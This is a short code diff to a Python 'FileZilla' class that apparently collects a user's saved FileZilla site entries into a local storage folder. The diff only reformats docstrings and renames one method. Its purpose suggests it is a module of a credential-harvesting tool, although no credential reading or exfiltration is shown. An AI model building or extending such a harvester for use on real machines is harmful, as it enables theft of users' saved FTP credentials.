@@ -17,15 +17,25 @@ class FileZilla:
     def __create_folder(self) -> None:
         """
         Creates storage for the FileZilla module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if not path.exists(self.__full_path):
             makedirs(self.__full_path)
 
-    def __get_sites(self) -> None:
+    def __get_hosts(self) -> None:
         """
         Collects all FileZilla hosts.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if not path.exists(self.__config.SitesPath):
             return
@@ -71,11 +81,16 @@ class FileZilla:
     def run(self) -> None:
         """
         Launches the FileZilla hosts collection module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         try:
 
-            self.__get_sites()
+            self.__get_hosts()
 
         except Exception as e:
             print(f"[FileZilla]: {repr(e)}")
